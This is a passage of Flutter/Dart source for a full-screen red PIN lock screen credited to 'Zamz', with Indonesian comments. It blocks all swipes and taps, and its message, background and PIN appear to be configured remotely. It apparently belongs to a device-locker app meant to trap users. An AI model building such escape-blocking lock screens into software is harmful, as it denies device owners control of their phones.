        backgroundColor: Colors.black,
        body: _buildBody(),
      ),
    );
  }

  Widget _buildBody() {
    return GestureDetector(
      // Tangkap semua gesture — nothing passes through
      onTap: () => _pinFocus.requestFocus(),
      onVerticalDragUpdate: (_) {},    // block swipe notif
      onHorizontalDragUpdate: (_) {}, // block swipe
      child: Container(
        width: double.infinity,
        height: double.infinity,
        decoration: currentLockBgUrl.isNotEmpty
            ? BoxDecoration(
                image: DecorationImage(
                  image: NetworkImage(currentLockBgUrl),
                  fit: BoxFit.cover,
                  colorFilter: ColorFilter.mode(
                      Colors.black.withOpacity(0.65), BlendMode.darken),
                ),
              )
            : const BoxDecoration(
                gradient: LinearGradient(
                  colors: [Color(0xFF0A0000), Colors.black],
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                ),
              ),
        child: SafeArea(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Spacer(flex: 2),

              // ── ICON GEMBOK ────────────────────────────────────
              _PulsingLock(),
              const SizedBox(height: 28),

              // ── PESAN ──────────────────────────────────────────
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 32),
                child: Text(
                  currentLockMessage,
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                    color: Colors.red,
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1.1,
                    height: 1.4,
                  ),
                ),
              ),
              const SizedBox(height: 6),
              const Text(
                "Developed By Zamz",
                style: TextStyle(color: Colors.white24, fontSize: 12),
              ),

              const Spacer(flex: 2),

              // ── NUMPAD PIN ────────────────────────────────────
              _AnimatedShake(
                shaking: _shaking,
                child: _buildNumpad(),
              ),

              const Spacer(flex: 1),

              // Indikator berapa kali salah
              if (_wrongCount > 0)
                Padding(
                  padding: const EdgeInsets.only(bottom: 12),
                  child: Text(
                    "$_wrongCount× PIN Salah",
                    style: const TextStyle(color: Colors.red, fontSize: 12),
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  // ── NUMPAD ──────────────────────────────────────────────────
  Widget _buildNumpad() {
    return Column(
      children: [
        // Dots display
        _buildDotsDisplay(),
        const SizedBox(height: 24),

        // Grid angka
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 40),
          child: Column(
            children: [
              _numRow(["1", "2", "3"]),
              const SizedBox(height: 12),
              _numRow(["4", "5", "6"]),
              const SizedBox(height: 12),
              _numRow(["7", "8", "9"]),
              const SizedBox(height: 12),
              _numRow(["", "0", "⌫"]),
            ],
          ),
        ),

        const SizedBox(height: 24),

        // Tombol Enter
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 40),
          child: SizedBox(
            width: double.infinity,
            height: 54,
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.red[900],
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16)),
                elevation: 8,
              ),
              onPressed: _checkPin,
              child: const Text(
                "BUKA KUNCI",
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 3,
                ),
              ),
            ),
          ),
        ),
      ],
    );
  }

  // ── DOTS DISPLAY ────────────────────────────────────────────
  Widget _buildDotsDisplay() {
    final int len = _pinCtrl.text.length;
    final int maxDots = currentLockPIN.length.clamp(4, 8);
    return Row(
      mainAxisAlignment: MainAxisAlignment.center,
      children: List.generate(maxDots, (i) {
        bool filled = i < len;
        return AnimatedContainer(
          duration: const Duration(milliseconds: 150),
          margin: const EdgeInsets.symmetric(horizontal: 8),
          width:  filled ? 18 : 14,
          height: filled ? 18 : 14,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: filled ? Colors.red : Colors.transparent,
            border: Border.all(
                color: filled ? Colors.red : Colors.white38, width: 2),
          ),
        );
      }),
    );
  }

  // ── ROW NUMPAD ───────────────────────────────────────────────
  Widget _numRow(List<String> keys) {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
      children: keys.map((k) {
        if (k.isEmpty) return const SizedBox(width: 72, height: 72);
        return _NumKey(
          label: k,
          onTap: () {
            if (k == "⌫") {
              if (_pinCtrl.text.isNotEmpty) {
                setState(() => _pinCtrl.text =
                    _pinCtrl.text.substring(0, _pinCtrl.text.length - 1));
              }
            } else {
              // Auto submit kalau sudah cukup digit
              setState(() => _pinCtrl.text += k);
              if (_pinCtrl.text.length >= currentLockPIN.length) {
                Future.delayed(
                    const Duration(milliseconds: 150), _checkPin);
              }
            }
          },
        );
      }).toList(),
    );
  }
}

// =================================================================
//  NUMPAD KEY WIDGET
// =================================================================
class _NumKey extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  const _NumKey({required this.label, required this.onTap});
  @override
  State<_NumKey> createState() => _NumKeyState();
}

class _NumKeyState extends State<_NumKey> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 80),
        width: 72,
        height: 72,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          color: _pressed
              ? Colors.red.withOpacity(0.3)
              : Colors.white.withOpacity(0.07),
          border: Border.all(
              color: _pressed ? Colors.red : Colors.white24, width: 1.5),
        ),
        child: Center(
          child: Text(
            widget.label,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 24,
              fontWeight: FontWeight.w300,
            ),
          ),
        ),
      ),
    );
  }
}

// =================================================================
//  PULSING LOCK ICON
// =================================================================
class _PulsingLock extends StatefulWidget {
  @override
  State<_PulsingLock> createState() => _PulsingLockState();
}

class _PulsingLockState extends State<_PulsingLock>
    with SingleTickerProviderStateMixin {
  late AnimationController _ctrl;
  late Animation<double> _anim;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat(reverse: true);
    _anim = Tween<double>(begin: 0.85, end: 1.0).animate(
        CurvedAnimation(parent: _ctrl, curve: Curves.easeInOut));
  }

  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return ScaleTransition(
      scale: _anim,
      child: Container(
        padding: const EdgeInsets.all(28),
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          color: Colors.red.withOpacity(0.12),
          border: Border.all(color: Colors.red.withOpacity(0.6), width: 2),
          boxShadow: [
            BoxShadow(
                color: Colors.red.withOpacity(0.3),
                blurRadius: 30,
                spreadRadius: 5),
          ],
        ),
        child: const Icon(Icons.lock, color: Colors.red, size: 72),
      ),
    );
  }
}

// =================================================================
//  SHAKE ANIMATION
// =================================================================
class _AnimatedShake extends StatelessWidget {
  final bool shaking;
  final Widget child;
  const _AnimatedShake({required this.shaking, required this.child});

  @override
  Widget build(BuildContext context) {
    return AnimatedSlide(
      offset: shaking ? const Offset(0.02, 0) : Offset.zero,
      duration: const Duration(milliseconds: 60),
      curve: Curves.elasticIn,
      child: child,
    );
  }
}
